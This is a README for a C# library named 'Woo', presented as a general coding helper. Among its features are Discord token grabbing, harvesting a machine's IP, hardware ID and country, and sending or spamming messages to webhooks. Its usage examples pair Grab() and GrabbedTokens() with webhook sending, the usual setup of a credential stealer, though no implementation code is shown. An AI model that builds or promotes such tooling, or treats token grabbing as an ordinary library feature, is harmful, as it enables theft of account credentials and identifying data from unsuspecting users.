# Woo

Woo it's a library, that features different kinds of categories such as Discord Utilities , Strings, etc. Main purpose of this library is to make coding easier and faster for everyone.

## Installation

Download the released DLL and add it to references to your project.
## Features
```csharp
Discord Features: 
- Token Grabbing
- Send message to webhook
- Spam messages to webhook
- Delete webhook
 
Media Features:
- Get Image by Keyword
 
String Features:
- Random String
- Grab IP
- Grab HWID
- Grab Country
```

## Usage

```csharp
using Woo;

// Token Grabbing
Initialize with Grab();
String with the tokens is: GrabbedTokens();
Ex: Console.WriteLine(GrabbedTokens());

 Send message to webhook
Send("name", "avatarurl", "message", "webhookurl");

// Spam messages to webhook (Might add proxies)
Spam("name", "avatarurl", "message", "webhookurl", "times"); // "times" is an int

// Delete Webhook
Delete("webhookurl");

// Get image by keyword
GetImageByKeyword("keyword");

// Random String
RandomString("length"); // "length" is an int

// Grab IP
GetIP();

// Grab HWID
GetHWID();

// Grab Country
GetCountry();
```

## Future Releases 
Will update adding more features, I need suggestions or inspiration lol.

If you need to contact me you can on discord: x4#0001
